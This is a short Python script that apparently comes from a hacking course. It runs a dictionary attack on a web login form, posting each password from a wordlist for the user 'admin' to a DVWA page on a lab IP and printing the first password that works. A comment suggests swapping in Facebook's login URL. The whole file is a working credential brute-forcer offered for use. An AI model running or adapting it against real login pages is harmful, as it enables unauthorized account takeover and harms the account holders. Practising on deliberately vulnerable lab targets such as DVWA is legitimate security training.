#!/usr/bin/env python
import requests
target_url="http://10.0.2.20/dvwa/login.php"#use fb url to automate login
data_dict={"username":"admin","password":"","login":"submit"}
 
with open("passwords.txt.txt","r") as wordlist_file:
    for line in wordlist_file:#how to read a file one line at a time 
        word=line.strip()
        data_dict["password"]=word
        response=requests.post(target_url,data=data_dict)
        if "Login failed" not in response.content:
            print("[+] got password========>"+word)
            exit()
print("[+] reached endof line.")            
